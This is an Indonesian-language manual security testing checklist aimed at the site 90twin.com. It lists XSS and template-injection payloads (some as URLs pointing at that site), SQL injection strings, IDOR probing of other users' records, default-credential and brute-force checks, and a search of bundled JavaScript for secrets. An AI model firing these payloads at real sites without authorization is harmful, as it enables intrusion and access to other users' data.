Manual Security Test Guide - 90twin.com

1. XSS (Cross-Site Scripting) Payloads

Masukkan payload berikut ke semua input field, search box, URL parameter:

Basic XSS:
<script>alert('XSS')</script>
Img onerror:
<img src=x onerror=alert('XSS')>
SVG XSS:
<svg onload=alert('XSS')>
DOM XSS via URL hash (untuk SPA):
https://90twin.com/#/<img src=x onerror=alert(1)>
https://90twin.com/#/%3Cscript%3Ealert(1)%3C/script%3E
JavaScript URI:
javascript:alert('XSS')
Template Injection (Vue/Angular):
{{7*7}} → jika muncul 49, ada template injection!
{{constructor.constructor('alert(1)')()}}

2. SQL Injection Payloads (untuk form/API)

' OR '1'='1
' OR 1=1--
" OR 1=1--
admin'--
1' AND SLEEP(5)-- (time-based blind)

3. IDOR (Insecure Direct Object Reference)

Jika ada URL seperti /api/user/123 atau /profile/123:

Coba ganti angka: /api/user/1, /api/user/2, /api/user/124
Coba akses resource user lain tanpa login

4. Authentication Testing

TestCaraRisk
Default credentials admin/admin, admin/password, admin/123456 HIGH
Brute force protection Login salah 10x - apakah diblokir? HIGH
Password reset flaw Coba reset password, apakah token bisa ditebak? HIGH
JWT token Decode di jwt.io - cek algorithm, exp, isi sensitif MEDIUM
Session fixation Apakah session ID berubah setelah login? MEDIUM

5. API Security (buka DevTools → Network tab)

Hal yang perlu dicek di tab Network browser:

✓ URL API endpoint yang dipanggil
✓ Apakah ada token/key di URL (bukan header)?
✓ Apakah response mengandung data sensitif berlebih?
✓ Apakah ada endpoint tanpa autentikasi?
✓ Apakah HTTPS digunakan untuk semua request?

7. Source Code Review (di browser)

Di browser, tekan F12 → Sources:

✓ Cari kata kunci: password, secret, key, token, api_key, apikey, auth
✓ Periksa file .env yang mungkin ter-bundle di JS
✓ Cek apakah ada hardcoded credentials di JavaScript
